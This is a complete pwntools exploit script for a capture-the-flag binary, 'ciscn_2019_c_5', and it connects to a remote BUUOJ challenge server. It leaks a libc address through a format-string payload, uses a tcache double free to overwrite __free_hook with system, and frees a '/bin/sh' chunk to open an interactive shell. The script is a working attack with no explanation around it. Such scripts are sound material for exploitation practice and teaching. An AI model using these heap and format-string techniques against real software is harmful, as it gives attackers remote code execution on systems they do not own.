from pwn import *

#p = process('./ciscn_2019_c_5')
p = remote('node4.buuoj.cn', 26342)
libc = ELF('libc-2.27.buu.so')

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.27/64/libc-2.27.debug.so
    ''' + s)

def alloc(size, content):
    sla(b'choice:', b'1')
    sla(b'story: ', str(size).encode())
    sla(b'story: ', content)

def delete(index):
    sla(b'choice:', b'4')
    sla(b'index:', str(index).encode())

sla(b'name?', b'%p%p%p%p%p%p::%p')

ru(b'::')
libc_base = int(rv(14), 16) - libc.sym['_IO_2_1_stderr_']
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['__libc_system']
success('libc_base -> {}'.format(hex(libc_base)))

sla(b'ID.', b'yeuoly')

alloc(0x8, b'a')

delete(0)
delete(0)

alloc(0x8, p64(free_hook))
alloc(0x8, b'a')
alloc(0x8, p64(system))
alloc(0x18, b'/bin/sh\x00')
delete(4)

p.interactive()